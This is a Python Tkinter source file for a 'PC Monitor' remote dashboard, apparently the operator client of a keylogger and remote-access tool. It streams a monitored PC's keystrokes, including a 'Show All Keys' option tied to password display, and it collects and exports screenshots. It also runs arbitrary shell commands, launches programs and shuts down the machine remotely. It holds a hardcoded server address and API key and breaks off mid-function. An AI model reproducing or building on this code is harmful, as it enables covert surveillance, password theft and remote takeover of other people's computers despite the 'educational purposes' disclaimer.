import requests
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
from PIL import Image, ImageTk
import io
import base64
from datetime import datetime
import threading
import time
import json
import sys
import os
from pathlib import Path

def get_config_path():
    """Get the path to the config file"""
    if getattr(sys, 'frozen', False):
        # Running as compiled executable
        return Path(sys.executable).parent / "client_config.json"
    else:
        # Running as script
        return Path(__file__).parent / "client_config.json"

def load_client_config():
    """Load client configuration"""
    config_path = get_config_path()
    
    if config_path.exists():
        try:
            with open(config_path, 'r') as f:
                return json.load(f)
        except:
            pass
    
    # Return defaults
    return {
        "server_url": "http://192.168.0.48:5000",
        "api_key": "1BDaDEaUIsuN6v08R_v05h"
    }

def save_client_config(config):
    """Save client configuration"""
    config_path = get_config_path()
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=4)

class PCMonitorClient:
    def __init__(self, server_url, api_key):
        self.server_url = server_url.rstrip('/')
        self.api_key = api_key
        self.headers = {'X-API-Key': api_key}
        self.session = requests.Session()
        
    def get_status(self):
        try:
            resp = self.session.get(f"{self.server_url}/api/status", timeout=3)
            resp.raise_for_status()
            return resp.json()
        except requests.exceptions.Timeout:
            return {"error": "Connection timeout"}
        except requests.exceptions.ConnectionError:
            return {"error": "Cannot connect to server"}
        except Exception as e:
            return {"error": str(e)}
    
    def start_monitoring(self):
        try:
            resp = self.session.post(f"{self.server_url}/api/start", headers=self.headers, timeout=5)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return {"error": str(e)}
    
    def stop_monitoring(self):
        try:
            resp = self.session.post(f"{self.server_url}/api/stop", headers=self.headers, timeout=5)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return {"error": str(e)}
    
    def kill_server(self):
        """Kill the server process"""
        try:
            resp = self.session.post(f"{self.server_url}/api/kill", headers=self.headers, timeout=5)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return {"error": str(e)}
    
    def get_events(self, limit=50, event_type=None, search=None, start_date=None, end_date=None):
        try:
            params = {'limit': limit}
            if event_type and event_type != 'all':
                params['type'] = event_type
            if search:
                params['search'] = search
            if start_date and start_date != "YYYY-MM-DD":
                params['start_date'] = start_date
            if end_date and end_date != "YYYY-MM-DD":
                params['end_date'] = end_date
            
            resp = self.session.get(f"{self.server_url}/api/events", headers=self.headers, params=params, timeout=5)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            print(f"Error getting events: {e}")
            return []
    
    def get_live_keystrokes(self):
        try:
            resp = self.session.get(f"{self.server_url}/api/keystrokes/live", headers=self.headers, timeout=3)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return {"keystrokes": [], "text": ""}
    
    def get_keystroke_buffer(self, as_text=True):
        try:
            params = {'format': 'text' if as_text else 'json'}
            resp = self.session.get(f"{self.server_url}/api/keystrokes/buffer", headers=self.headers, params=params, timeout=5)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return {"text": "", "count": 0}
    
    def get_latest_screenshot(self):
        try:
            resp = self.session.get(f"{self.server_url}/api/screenshot/latest", headers=self.headers, timeout=10)
            resp.raise_for_status()
            data = resp.json()
            if 'image' in data:
                return base64.b64decode(data['image'])
            return None
        except Exception as e:
            print(f"Error getting screenshot: {e}")
            return None
    
    def get_screenshot_history(self):
        try:
            resp = self.session.get(f"{self.server_url}/api/screenshot/history", headers=self.headers, timeout=5)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return []
    
    def get_screenshot_by_filename(self, filename):
        try:
            resp = self.session.get(f"{self.server_url}/api/screenshot/{filename}", headers=self.headers, timeout=10)
            resp.raise_for_status()
            data = resp.json()
            if 'image' in data:
                return base64.b64decode(data['image'])
            return None
        except Exception as e:
            return None
    
    def take_snapshot(self):
        try:
            resp = self.session.post(f"{self.server_url}/api/snapshot", headers=self.headers, timeout=5)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return {"error": str(e)}
    
    def update_screenshot_settings(self, enabled, interval):
        try:
            resp = self.session.post(
                f"{self.server_url}/api/settings/screenshot",
                headers=self.headers,
                json={"enabled": enabled, "interval": interval},
                timeout=5
            )
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return {"error": str(e)}
    
    def execute_command(self, cmd_type, **kwargs):
        try:
            data = {"type": cmd_type, **kwargs}
            resp = self.session.post(f"{self.server_url}/api/command", headers=self.headers, json=data, timeout=30)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return {"error": str(e)}
    
    def export_data(self, export_type='events'):
        try:
            resp = self.session.get(f"{self.server_url}/api/export", headers=self.headers, params={'type': export_type}, timeout=10)
            resp.raise_for_status()
            return resp.json()
        except Exception as e:
            return []

class MonitorGUI:
    def __init__(self, root, client):
        self.root = root
        self.client = client
        self.root.title("PC Monitor - Remote Dashboard")
        self.root.geometry("1400x900")
        
        # Thread control
        self.is_running = True
        self.current_image = None
        self.update_in_progress = False
        self.show_passwords = False
        self._preview_photo = None  # Initialize preview photo reference
        
        # Create menu
        self.create_menu()
        
        # Create main interface
        self.create_status_frame()
        self.create_notebook()
        
        # Handle window close
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # Initial update
        self.root.after(100, self.manual_refresh)
        
        # Start background threads
        self.start_background_threads()
    
    def create_menu(self):
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # Settings menu
        settings_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Settings", menu=settings_menu)
        settings_menu.add_command(label="Change Server", command=self.change_server)
        settings_menu.add_command(label="Screenshot Settings", command=self.screenshot_settings)
        settings_menu.add_separator()
        settings_menu.add_command(label="Exit", command=self.on_closing)
        
        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="Export Events", command=lambda: self.export_data('events'))
        tools_menu.add_command(label="Export Keystrokes", command=lambda: self.export_data('keystrokes'))
        tools_menu.add_separator()
        tools_menu.add_command(label="Remote Control", command=self.show_remote_control)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="About", command=self.show_about)
    
    def create_status_frame(self):
        status_frame = ttk.LabelFrame(self.root, text="Server Status", padding=10)
        status_frame.pack(fill="x", padx=10, pady=5)
        
        self.status_label = ttk.Label(status_frame, text="Checking...", font=("Arial", 10))
        self.status_label.pack(side="left", padx=10)
        
        self.pc_info_label = ttk.Label(status_frame, text="", font=("Arial", 9))
        self.pc_info_label.pack(side="left", padx=10)
        
        ttk.Button(status_frame, text="Refresh", command=self.manual_refresh).pack(side="left", padx=5)
        ttk.Button(status_frame, text="Start", command=self.start_monitoring).pack(side="left", padx=5)
        ttk.Button(status_frame, text="Stop", command=self.stop_monitoring).pack(side="left", padx=5)
        ttk.Button(status_frame, text="Snapshot", command=self.take_snapshot).pack(side="left", padx=5)
        
        # Kill switch button (red, prominent)
        kill_btn = tk.Button(status_frame, text="⚠ KILL SERVER", command=self.kill_server,
                            bg="#ff4444", fg="white", font=("Arial", 9, "bold"),
                            relief=tk.RAISED, padx=10)
        kill_btn.pack(side="left", padx=15)
        
        self.auto_refresh = tk.BooleanVar(value=True)
        ttk.Checkbutton(status_frame, text="Auto-refresh", variable=self.auto_refresh).pack(side="right", padx=10)
    
    def create_notebook(self):
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Tab 1: Live View & Events
        self.create_overview_tab()
        
        # Tab 2: Live Keylogger
        self.create_keylogger_tab()
        
        # Tab 3: Screenshot Gallery
        self.create_gallery_tab()
        
        # Tab 4: Search & Filter
        self.create_search_tab()
    
    def create_overview_tab(self):
        overview_frame = ttk.Frame(self.notebook)
        self.notebook.add(overview_frame, text="Overview")
        
        paned = ttk.PanedWindow(overview_frame, orient="horizontal")
        paned.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Left: Screenshot
        left_frame = ttk.LabelFrame(paned, text="Live View", padding=10)
        paned.add(left_frame, weight=2)
        
        self.screenshot_label = ttk.Label(left_frame, text="No screenshot", background="gray")
        self.screenshot_label.pack(fill="both", expand=True)
        self.screenshot_label.bind("<Button-1>", self.view_fullscreen_screenshot)
        
        ttk.Button(left_frame, text="Refresh Screenshot", command=self.async_update_screenshot).pack(pady=5)
        
        # Right: Events
        right_frame = ttk.LabelFrame(paned, text="Activity Log", padding=10)
        paned.add(right_frame, weight=1)
        
        self.events_text = scrolledtext.ScrolledText(right_frame, wrap=tk.WORD, height=30, font=("Consolas", 9))
        self.events_text.pack(fill="both", expand=True)
        
        ttk.Button(right_frame, text="Refresh Events", command=self.async_update_events).pack(pady=5)
    
    def create_keylogger_tab(self):
        keylogger_frame = ttk.Frame(self.notebook)
        self.notebook.add(keylogger_frame, text="Live Keylogger")
        
        # Controls
        control_frame = ttk.Frame(keylogger_frame)
        control_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Label(control_frame, text="Live Keystroke Feed:", font=("Arial", 10, "bold")).pack(side="left", padx=5)
        
        self.show_passwords_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(control_frame, text="Show All Keys", variable=self.show_passwords_var).pack(side="left", padx=5)
        
        ttk.Button(control_frame, text="Clear", command=self.clear_keylogger).pack(side="left", padx=5)
        ttk.Button(control_frame, text="Export Text", command=self.export_keylogger_text).pack(side="left", padx=5)
        
        self.keylogger_active_label = ttk.Label(control_frame, text="● LIVE", foreground="green", font=("Arial", 9, "bold"))
        self.keylogger_active_label.pack(side="right", padx=10)
        
        # Live feed
        feed_frame = ttk.LabelFrame(keylogger_frame, text="Live Text Stream", padding=10)
        feed_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.keylogger_text = scrolledtext.ScrolledText(feed_frame, wrap=tk.WORD, font=("Consolas", 10), height=15)
        self.keylogger_text.pack(fill="both", expand=True)
        
        # Buffer view
        buffer_frame = ttk.LabelFrame(keylogger_frame, text="Keystroke Buffer (with context)", padding=10)
        buffer_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.buffer_text = scrolledtext.ScrolledText(buffer_frame, wrap=tk.WORD, font=("Consolas", 9), height=10)
        self.buffer_text.pack(fill="both", expand=True)
        
        ttk.Button(buffer_frame, text="Load Buffer", command=self.load_keystroke_buffer).pack(pady=5)
    
    def create_gallery_tab(self):
        gallery_frame = ttk.Frame(self.notebook)
        self.notebook.add(gallery_frame, text="Screenshot Gallery")
        
        # Controls
        control_frame = ttk.Frame(gallery_frame)
        control_frame.pack(fill="x", padx=5, pady=5)
        
        ttk.Button(control_frame, text="Refresh Gallery", command=self.load_screenshot_gallery).pack(side="left", padx=5)
        ttk.Label(control_frame, text="Double-click to view full size", font=("Arial", 9, "italic")).pack(side="left", padx=20)
        
        # Gallery list
        list_frame = ttk.Frame(gallery_frame)
        list_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        scrollbar = ttk.Scrollbar(list_frame)
        scrollbar.pack(side="right", fill="y")
        
        self.gallery_listbox = tk.Listbox(list_frame, yscrollcommand=scrollbar.set, font=("Consolas", 9), height=20)
        self.gallery_listbox.pack(side="left", fill="both", expand=True)
        scrollbar.config(command=self.gallery_listbox.yview)
        
        self.gallery_listbox.bind("<Double-Button-1>", self.view_gallery_screenshot)
        self.gallery_listbox.bind("<<ListboxSelect>>", self.preview_gallery_screenshot)
        
        # Preview
        preview_frame = ttk.LabelFrame(gallery_frame, text="Preview", padding=10)
        preview_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.gallery_preview_label = ttk.Label(preview_frame, text="Select a screenshot", background="gray")
        self.gallery_preview_label.pack(fill="both", expand=True)
    
    def create_search_tab(self):
        search_frame = ttk.Frame(self.notebook)
        self.notebook.add(search_frame, text="Search & Filter")
        
        # Search controls
        control_frame = ttk.LabelFrame(search_frame, text="Filters", padding=10)
        control_frame.pack(fill="x", padx=5, pady=5)
        
        # Search text
        ttk.Label(control_frame, text="Search:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.search_entry = ttk.Entry(control_frame, width=30)
        self.search_entry.grid(row=0, column=1, padx=5, pady=5)
        
        # Event type filter
        ttk.Label(control_frame, text="Event Type:").grid(row=0, column=2, padx=5, pady=5, sticky="w")
        self.event_type_var = tk.StringVar(value="all")
        event_type_combo = ttk.Combobox(control_frame, textvariable=self.event_type_var, width=15)
        event_type_combo['values'] = ('all', 'mouse_click', 'key_press', 'window_change', 'screenshot')
        event_type_combo.grid(row=0, column=3, padx=5, pady=5)
        
        # Date filters
        ttk.Label(control_frame, text="Start Date:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.start_date_entry = ttk.Entry(control_frame, width=20)
        self.start_date_entry.insert(0, "YYYY-MM-DD")
        self.start_date_entry.grid(row=1, column=1, padx=5, pady=5)
        
        ttk.Label(control_frame, text="End Date:").grid(row=1, column=2, padx=5, pady=5, sticky="w")
        self.end_date_entry = ttk.Entry(control_frame, width=20)
        self.end_date_entry.insert(0, "YYYY-MM-DD")
        self.end_date_entry.grid(row=1, column=3, padx=5, pady=5)
        
        # Search button
        ttk.Button(control_frame, text="Search", command=self.perform_search).grid(row=0, column=4, padx=10, pady=5, rowspan=2, sticky="ns")
        ttk.Button(control_frame, text="Clear", command=self.clear_search).grid(row=0, column=5, padx=5, pady=5, rowspan=2, sticky="ns")
        
        # Results
        results_frame = ttk.LabelFrame(search_frame, text="Search Results", padding=10)
        results_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        self.search_results_text = scrolledtext.ScrolledText(results_frame, wrap=tk.WORD, font=("Consolas", 9))
        self.search_results_text.pack(fill="both", expand=True)
        
        ttk.Button(results_frame, text="Export Results", command=self.export_search_results).pack(pady=5)
    
    # Event handlers
    def on_closing(self):
        self.is_running = False
        time.sleep(0.5)
        self.root.quit()
        self.root.destroy()
    
    def change_server(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Change Server")
        dialog.geometry("400x250")
        dialog.transient(self.root)
        dialog.grab_set()
        
        ttk.Label(dialog, text="Server URL:", font=("Arial", 10, "bold")).pack(pady=5)
        url_entry = ttk.Entry(dialog, width=40)
        url_entry.insert(0, self.client.server_url)
        url_entry.pack(pady=5)
        
        ttk.Label(dialog, text="API Key:", font=("Arial", 10, "bold")).pack(pady=5)
        key_entry = ttk.Entry(dialog, width=40, show="*")
        key_entry.insert(0, self.client.api_key)
        key_entry.pack(pady=5)
        
        show_var = tk.BooleanVar(value=False)
        def toggle_show():
            key_entry.config(show="" if show_var.get() else "*")
        ttk.Checkbutton(dialog, text="Show API Key", variable=show_var, command=toggle_show).pack(pady=5)
        
        def save_settings():
            new_url = url_entry.get().rstrip('/')
            new_key = key_entry.get()
            
            if not new_url or not new_key:
                messagebox.showerror("Error", "URL and API Key cannot be empty!")
                return
            
            self.client.server_url = new_url
            self.client.api_key = new_key
            self.client.headers = {'X-API-Key': self.client.api_key}
            
            try:
                save_client_config({
                    "server_url": self.client.server_url,
                    "api_key": self.client.api_key
                })
                messagebox.showinfo("Success", "Settings saved!")
            except Exception as e:
                messagebox.showwarning("Warning", f"Settings updated but not saved: {e}")
            
            dialog.destroy()
            self.manual_refresh()
        
        ttk.Button(dialog, text="Save & Connect", command=save_settings).pack(pady=10)
    
    def screenshot_settings(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Screenshot Settings")
        dialog.geometry("400x250")
        dialog.transient(self.root)
        dialog.grab_set()
        
        # Get current status
        status = self.client.get_status()
        current_enabled = status.get('auto_screenshot', False)
        
        ttk.Label(dialog, text="Automatic Screenshot Settings", font=("Arial", 11, "bold")).pack(pady=10)
        
        enabled_var = tk.BooleanVar(value=current_enabled)
        ttk.Checkbutton(dialog, text="Enable Automatic Screenshots", variable=enabled_var).pack(pady=10)
        
        ttk.Label(dialog, text="Interval (seconds):").pack(pady=5)
        interval_var = tk.IntVar(value=300)
        interval_spinbox = ttk.Spinbox(dialog, from_=60, to=3600, textvariable=interval_var, width=10)
        interval_spinbox.pack(pady=5)
        
        ttk.Label(dialog, text="Common intervals: 60s (1min), 300s (5min), 600s (10min)", 
                 font=("Arial", 8, "italic")).pack(pady=5)
        
        def save_screenshot_settings():
            result = self.client.update_screenshot_settings(enabled_var.get(), interval_var.get())
            if 'error' in result:
                messagebox.showerror("Error", result['error'])
            else:
                messagebox.showinfo("Success", f"Screenshot settings updated!\nEnabled: {result['enabled']}\nInterval: {result['interval']}s")
                dialog.destroy()
        
        ttk.Button(dialog, text="Save Settings", command=save_screenshot_settings).pack(pady=20)
    
    def show_remote_control(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Remote Control")
        dialog.geometry("500x400")
        dialog.transient(self.root)
        
        ttk.Label(dialog, text="Remote PC Control", font=("Arial", 12, "bold")).pack(pady=10)
        
        # System controls
        system_frame = ttk.LabelFrame(dialog, text="System Controls", padding=10)
        system_frame.pack(fill="x", padx=10, pady=10)
        
        ttk.Button(system_frame, text="Shutdown PC", 
                  command=lambda: self.execute_remote_command('shutdown')).pack(fill="x", pady=5)
        ttk.Button(system_frame, text="Restart PC", 
                  command=lambda: self.execute_remote_command('restart')).pack(fill="x", pady=5)
        
        # Launch application
        launch_frame = ttk.LabelFrame(dialog, text="Launch Application", padding=10)
        launch_frame.pack(fill="x", padx=10, pady=10)
        
        ttk.Label(launch_frame, text="Application Path:").pack(anchor="w")
        app_path_entry = ttk.Entry(launch_frame, width=50)
        app_path_entry.pack(fill="x", pady=5)
        app_path_entry.insert(0, "notepad.exe")
        
        ttk.Button(launch_frame, text="Launch", 
                  command=lambda: self.execute_remote_command('launch', path=app_path_entry.get())).pack()
        
        # Shell command
        shell_frame = ttk.LabelFrame(dialog, text="Execute Shell Command", padding=10)
        shell_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        ttk.Label(shell_frame, text="Command:").pack(anchor="w")
        shell_entry = ttk.Entry(shell_frame, width=50)
        shell_entry.pack(fill="x", pady=5)
        
        output_text = scrolledtext.ScrolledText(shell_frame, height=5, font=("Consolas", 9))
        output_text.pack(fill="both", expand=True, pady=5)
        
        def execute_shell():
            cmd = shell_entry.get()
            if not cmd:
                return
            
            result = self.client.execute_command('shell', command=cmd)
            output_text.delete(1.0, tk.END)
            if 'error' in result:
                output_text.insert(tk.END, f"Error: {result['error']}")
            else:
                output_text.insert(tk.END, f"Return Code: {result.get('returncode', 'N/A')}\n\n")
                output_text.insert(tk.END, f"STDOUT:\n{result.get('stdout', '')}\n\n")
                output_text.insert(tk.END, f"STDERR:\n{result.get('stderr', '')}")
        
        ttk.Button(shell_frame, text="Execute", command=execute_shell).pack()
    
    def show_about(self):
        messagebox.showinfo("About", 
                           "PC Monitor - Remote Dashboard\n\n"
                           "Features:\n"
                           "• Live keylogging\n"
                           "• Screenshot gallery\n"
                           "• Event search & filtering\n"
                           "• Remote control\n"
                           "• Kill switch\n\n"
                           "For educational purposes only.")
    
    # Core functionality
    def manual_refresh(self):
        """Manual refresh of all data"""
        self.update_in_progress = True
        
        def _refresh():
            try:
                # Update status
                status = self.client.get_status()
                
                def _update_ui():
                    if 'error' in status:
                        self.status_label.config(text=f"❌ {status['error']}", foreground="red")
                        self.pc_info_label.config(text="")
                    else:
                        mon_status = "🟢 MONITORING" if status.get('monitoring') else "🔴 STOPPED"
                        self.status_label.config(text=mon_status, 
                                               foreground="green" if status.get('monitoring') else "red")
                        
                        pc_name = status.get('pc_name', 'Unknown')
                        event_count = status.get('event_count', 0)
                        keystroke_count = status.get('keystroke_count', 0)
                        self.pc_info_label.config(
                            text=f"PC: {pc_name} | Events: {event_count} | Keystrokes: {keystroke_count}"
                        )
                    
                    self.update_in_progress = False
                
                self.root.after(0, _update_ui)
                
            except Exception as e:
                print(f"Refresh error: {e}")
                self.update_in_progress = False
        
        threading.Thread(target=_refresh, daemon=True).start()
        
        # Also refresh events and screenshot
        self.async_update_events()
        self.async_update_screenshot()
    
    def start_monitoring(self):
        def _start():
            result = self.client.start_monitoring()
            
            def _show_result():
                if 'error' in result:
                    messagebox.showerror("Error", result['error'])
                else:
                    messagebox.showinfo("Success", "Monitoring started!")
                self.manual_refresh()
            
            self.root.after(0, _show_result)
        
        threading.Thread(target=_start, daemon=True).start()
    
    def stop_monitoring(self):
        def _stop():
            result = self.client.stop_monitoring()
            
            def _show_result():
                if 'error' in result:
                    messagebox.showerror("Error", result['error'])
                else:
                    messagebox.showinfo("Success", "Monitoring stopped!")
                self.manual_refresh()
            
            self.root.after(0, _show_result)
        
        threading.Thread(target=_stop, daemon=True).start()
    
    def kill_server(self):
        """Kill the server completely"""
        if messagebox.askyesno("Confirm Kill", 
                              "⚠ WARNING ⚠\n\n"
                              "This will TERMINATE the server process immediately.\n"
                              "All monitoring will stop and the server will shut down.\n\n"
                              "Are you sure?"):
            def _kill():
                result = self.client.kill_server()
                
                def _show_result():
                    if 'error' in result:
                        messagebox.showwarning("Warning", f"Server may already be down: {result['error']}")
                    else:
                        messagebox.showinfo("Success", "Server killed successfully!")
                    self.manual_refresh()
                
                self.root.after(0, _show_result)
            
            threading.Thread(target=_kill, daemon=True).start()
    
    def take_snapshot(self):
        def _snapshot():
            result = self.client.take_snapshot()
            
            def _show_result():
                if 'error' in result:
                    messagebox.showerror("Error", result['error'])
                else:
                    messagebox.showinfo("Success", f"Snapshot saved: {result.get('filename')}")
                self.async_update_screenshot()
            
            self.root.after(0, _show_result)
        
        threading.Thread(target=_snapshot, daemon=True).start()
    
    def async_update_events(self):
        """Async update of events list"""
        def _update():
            events = self.client.get_events(limit=100)
            
            def _display():
                self.events_text.delete(1.0, tk.END)
                
                for event in reversed(events[-50:]):  # Last 50, newest first
                    timestamp = event.get('timestamp', '')
                    event_type = event.get('type', '')
                    details = event.get('details', {})
                    
                    self.events_text.insert(tk.END, f"[{timestamp}] ", "timestamp")
                    self.events_text.insert(tk.END, f"{event_type.upper()}", "type")
                    
                    if details:
                        detail_str = json.dumps(details, indent=2)
                        self.events_text.insert(tk.END, f"\n  {detail_str}\n\n")
                    else:
                        self.events_text.insert(tk.END, "\n\n")
                
                self.events_text.tag_config("timestamp", foreground="gray")
                self.events_text.tag_config("type", foreground="blue", font=("Consolas", 9, "bold"))
            
            self.root.after(0, _display)
        
        threading.Thread(target=_update, daemon=True).start()
    
    def async_update_screenshot(self):
        """Async update of screenshot"""
        def _update():
            img_data = self.client.get_latest_screenshot()
            
            def _display():
                if img_data:
                    try:
                        img = Image.open(io.BytesIO(img_data))
                        
                        # Resize to fit
                        display_width = 800
                        display_height = 600
                        img.thumbnail((display_width, display_height), Image.Resampling.LANCZOS)
                        
                        photo = ImageTk.PhotoImage(img)
                        self.current_image = photo  # Keep reference
                        
                        self.screenshot_label.config(image=photo, text="")
                    except Exception as e:
                        self.screenshot_label.config(text=f"Error loading image: {e}", image="")
                else:
                    self.screenshot_label.config(text="No screenshot available", image="")
            
            self.root.after(0, _display)
        
        threading.Thread(target=_update, daemon=True).start()
    
    def view_fullscreen_screenshot(self, event=None):
        """View screenshot in fullscreen window"""
        img_data = self.client.get_latest_screenshot()
        if not img_data:
            messagebox.showinfo("Info", "No screenshot available")
            return
        
        window = tk.Toplevel(self.root)
        window.title("Screenshot - Full Size")
        window.geometry("1200x800")
        
        img = Image.open(io.BytesIO(img_data))
        
        # Resize to window
        img.thumbnail((1200, 800), Image.Resampling.LANCZOS)
        photo = ImageTk.PhotoImage(img)
        
        label = ttk.Label(window, image=photo)
        label._image_keep = photo  # type: ignore  # Keep reference to prevent garbage collection
        label.pack(fill="both", expand=True)
        
        ttk.Button(window, text="Close", command=window.destroy).pack(pady=10)
    
    def clear_keylogger(self):
        self.keylogger_text.delete(1.0, tk.END)
    
    def load_keystroke_buffer(self):
        """Load full keystroke buffer with context"""
        def _load():
            data = self.client.get_keystroke_buffer(as_text=False)
            
            def _update():
                self.buffer_text.delete(1.0, tk.END)
                
                if isinstance(data, list):
                    for entry in data[-100:]:  # Last 100
                        timestamp = entry.get('timestamp', '')
                        key = entry.get('key', '')
                        window = entry.get('window', '')
                        
                        self.buffer_text.insert(tk.END, f"[{timestamp}] ", "timestamp")
                        self.buffer_text.insert(tk.END, f"{key}", "key")
                        self.buffer_text.insert(tk.END, f" in {window}\n", "window")
                    
                    self.buffer_text.tag_config("timestamp", foreground="gray", font=("Consolas", 8))
                    self.buffer_text.tag_config("key", foreground="blue", font=("Consolas", 9, "bold"))
                    self.buffer_text.tag_config("window", foreground="green", font=("Consolas", 8))
                
                self.buffer_text.see(tk.END)
            
            self.root.after(0, _update)
        
        threading.Thread(target=_load, daemon=True).start()
    
    def export_keylogger_text(self):
        """Export keylogger text to file"""
        text = self.keylogger_text.get(1.0, tk.END)
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")],
            initialfile=f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )
        
        if filename:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(text)
            messagebox.showinfo("Success", f"Exported to {filename}")
    
    def load_screenshot_gallery(self):
        """Load screenshot gallery"""
        def _load():
            history = self.client.get_screenshot_history()
            
            def _display():
                self.gallery_listbox.delete(0, tk.END)
                
                for item in reversed(history):  # Newest first
                    timestamp = item.get('timestamp', '')
                    filename = item.get('filename', '')
                    self.gallery_listbox.insert(tk.END, f"{timestamp} - {filename}")
            
            self.root.after(0, _display)
        
        threading.Thread(target=_load, daemon=True).start()
    
    def preview_gallery_screenshot(self, event=None):
        """Show preview of selected screenshot"""
        selection = self.gallery_listbox.curselection()
        if not selection:
            return
        
        idx = selection[0]
        item_text = self.gallery_listbox.get(idx)
        
        # Extract filename
        filename = item_text.split(" - ")[-1]
        
        def _load():
            img_data = self.client.get_screenshot_by_filename(filename)
            
            def _display():
                if img_data:
                    try:
                        img = Image.open(io.BytesIO(img_data))
                        img.thumbnail((600, 400), Image.Resampling.LANCZOS)
                        
                        photo = ImageTk.PhotoImage(img)
                        self.gallery_preview_label.config(image=photo, text="")
                        self._preview_photo = photo  # Keep reference as instance variable
                    except Exception as e:
                        self.gallery_preview_label.config(text=f"Error: {e}", image="")
                else:
                    self.gallery_preview_label.config(text="Failed to load", image="")
            
            self.root.after(0, _display)
        
        threading.Thread(target=_load, daemon=True).start()
    
    def view_gallery_screenshot(self, event=None):
        """View full size gallery screenshot"""
        selection = self.gallery_listbox.curselection()
        if not selection:
            return
        
        idx = selection[0]
        item_text = self.gallery_listbox.get(idx)
        
        # Extract filename
        filename = item_text.split(" - ")[-1]
        
        img_data = self.client.get_screenshot_by_filename(filename)
        if not img_data:
            messagebox.showerror("Error", "Failed to load screenshot")
            return
        
        window = tk.Toplevel(self.root)
        window.title(f"Screenshot - {filename}")
        window.geometry("1200x800")
        
        img = Image.open(io.BytesIO(img_data))
        img.thumbnail((1200, 800), Image.Resampling.LANCZOS)
        photo = ImageTk.PhotoImage(img)
        
        label = ttk.Label(window, image=photo)
        label.image = photo  # type: ignore
        label.pack(fill="both", expand=True)
        
        ttk.Button(window, text="Close", command=window.destroy).pack(pady=10)
    
    def perform_search(self):
        """Perform event search"""
        search_text = self.search_entry.get()
        event_type = self.event_type_var.get()
        start_date = self.start_date_entry.get()
        end_date = self.end_date_entry.get()
        
        def _search():
            events = self.client.get_events(
                limit=500,
                event_type=event_type if event_type != 'all' else None,
                search=search_text if search_text else None,
                start_date=start_date if start_date != "YYYY-MM-DD" else None,
                end_date=end_date if end_date != "YYYY-MM-DD" else None
            )
            
            def _display():
                self.search_results_text.delete(1.0, tk.END)
                
                self.search_results_text.insert(tk.END, f"Found {len(events)} events\n\n")
                
                for event in reversed(events):
                    timestamp = event.get('timestamp', '')
                    event_type = event.get('type', '')
                    details = event.get('details', {})
                    
                    self.search_results_text.insert(tk.END, f"[{timestamp}] {event_type.upper()}\n")
                    if details:
                        detail_str = json.dumps(details, indent=2)
                        self.search_results_text.insert(tk.END, f"  {detail_str}\n\n")
                    else:
                        self.search_results_text.insert(tk.END, "\n")
            
            self.root.after(0, _display)
        
        threading.Thread(target=_search, daemon=True).start()
    
    def clear_search(self):
        """Clear search filters"""
        self.search_entry.delete(0, tk.END)
        self.event_type_var.set('all')
        self.start_date_entry.delete(0, tk.END)
        self.start_date_entry.insert(0, "YYYY-MM-DD")
        self.end_date_entry.delete(0, tk.END)
        self.end_date_entry.insert(0, "YYYY-MM-DD")
        self.search_results_text.delete(1.0, tk.END)
    
    def export_search_results(self):
        """Export search results to file"""
        text = self.search_results_text.get(1.0, tk.END)
        
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("JSON files", "*.json"), ("All files", "*.*")],
            initialfile=f"search_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )
        
        if filename:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(text)
            messagebox.showinfo("Success", f"Exported to {filename}")
    
    def execute_remote_command(self, cmd_type, **kwargs):
        """Execute remote command on server"""
        def _execute():
            result = self.client.execute_command(cmd_type, **kwargs)
            
            def _show_result():
                if 'error' in result:
                    messagebox.showerror("Error", result['error'])
                else:
                    messagebox.showinfo("Success", f"Command executed: {result.get('status')}")
            
            self.root.after(0, _show_result)
        
        threading.Thread(target=_execute, daemon=True).start()
    
    def export_data(self, data_type):
        """Export data to file"""
        def _export():
            data = self.client.export_data(data_type)
            
            def _save():
                if not data:
                    messagebox.showinfo("Info", "No data to export")
                    return
                
                filename = filedialog.asksaveasfilename(
                    defaultextension=".json",
                    filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                    initialfile=f"{data_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                )
                
                if filename:
                    with open(filename, 'w', encoding='utf-8') as f:
